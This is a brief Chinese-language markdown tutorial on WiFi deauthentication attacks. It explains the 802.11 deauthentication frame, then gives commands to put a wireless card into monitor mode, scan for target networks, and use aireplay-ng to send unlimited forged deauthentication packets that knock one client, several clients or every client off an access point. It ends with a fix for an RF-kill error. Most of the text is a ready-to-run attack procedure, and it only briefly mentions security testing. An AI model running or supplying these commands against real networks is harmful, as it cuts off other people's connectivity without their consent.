# 解除WiFi认证(断开连接)攻击 Deauthentication
## Deauthentication
* ```
    Deauthentication（断开连接）是一种无线网络管理帧（Management Frame）的类型，
    用于通知客户端设备断开与 接入点 的连接。它是IEEE 802.11(数据包类型)标准中定义的一种帧类型。

## Deauthentication Attck 原理
* 发送伪造的 断开连接数据包 给client。
## 前提
* 需要带有监听功能的wifi适配器
* 确认你的无线网卡支持监控模式（monitor mode）和数据包注入（packet injection）。
* ```
    # 关闭wifi
    sudo ifconfig wlan0 down
    # 切换为监听模式
    sudo iw wlan0 set monitor none

    # iwconfig 查看是否为监听模式
    

## aireplay-ng工具
* aireplay-ng 是一款强大的网络攻击工具，用于`无线网络`的安全测试和攻击。
* ```
    # 扫描wifi网络得到BSSID,ESSID
    sudo rfkill unblock wifi
    sudo ifconfig wlan0 up  
    sudo iwlist wlan0 scan | grep -i 'cell\|bssid\|essid'

    # 注意 bssid是唯一标识符(可以是mac)，essid是wifi网络的名称
* ```
    # 扫描附近的无线网络(同上)
    sudo aireplay-ng -9 wlan0
    # 或者
    sudo airodump-ng wlan0
* ```
    # 发起断开连接攻击
    # --deauth 0表示发起无限个包
    # -c 可用逗号分隔开多个mac值，对多个设备进行断开wifi
    sudo aireplay-ng --deauth 0 -a <目标BSSID> -c <目标客户端MAC地址> wlan0
* ```
    # 断开所有设备wifi
    sudo aireplay-ng --deauth 0 -a <目标BSSID> wlan0

## 报错
* ```
    # 报错
    ioctl(SIOCSIFFLAGS) failed: Operation not possible due to RF-kill
    # 使用命令
    sudo rfkill unblock wifi
